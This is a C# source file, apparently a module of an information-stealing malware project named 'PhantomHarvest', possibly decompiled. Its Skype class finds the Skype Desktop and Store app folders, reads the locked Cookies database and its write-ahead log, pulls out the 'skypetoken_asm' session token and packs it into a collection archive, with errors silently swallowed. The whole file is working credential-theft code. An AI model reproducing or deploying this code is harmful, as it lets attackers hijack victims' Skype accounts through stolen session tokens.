using System;
using System.IO;
using System.Text;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000017 RID: 23
	internal class Skype
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (Directory.Exists(Skype.MessengerPaths[0]) || Directory.Exists(Skype.MessengerPaths[1]))
				{
					string text = Skype.Skype_cookies(Skype.MessengerPaths[0]);
					string text2 = Skype.Skype_cookies(Skype.MessengerPaths[1]);
					
					if (!string.IsNullOrEmpty(text))
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(text)))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, Skype.MessengerName + "/Skype_Desktop.txt", ms, DateTime.Now, "");
						}
					}
					if (!string.IsNullOrEmpty(text2))
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(text2)))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, Skype.MessengerName + "/Skype_Store.txt", ms, DateTime.Now, "");
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string Skype_cookies(string MessengerPath)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string text = Path.Combine(MessengerPath, "Network\\Cookies");
			if (!File.Exists(text))
			{
				return null;
			}
			try
			{
				byte[] fileBytes = LockedFile.ReadLockedFile(text);
				if (fileBytes == null) return null;

				DataParser sqliteHandler = new DataParser(fileBytes);
				
				// 检查 WAL 文件
				string walPath = text + "-wal";
				if (File.Exists(walPath))
				{
					try
					{
						byte[] walBytes = LockedFile.ReadLockedFile(walPath);
						if (walBytes != null)
						{
							sqliteHandler.ApplyWal(walBytes);
						}
					}
					catch {}
				}
				
				if (!sqliteHandler.ReadTable("cookies"))
				{
					return null;
				}
				for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
				{
					sqliteHandler.GetValue(i, "host_key");
					sqliteHandler.GetValue(i, "name");
					sqliteHandler.GetValue(i, "value");
					if (sqliteHandler.GetValue(i, "name") == "skypetoken_asm")
					{
						stringBuilder.AppendLine("{skypetoken}={" + sqliteHandler.GetValue(i, "value") + "}");
					}
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string MessengerName = "Skype";

		public static string[] MessengerPaths = new string[]
		{
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Skype for Desktop"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
		};
	}
}
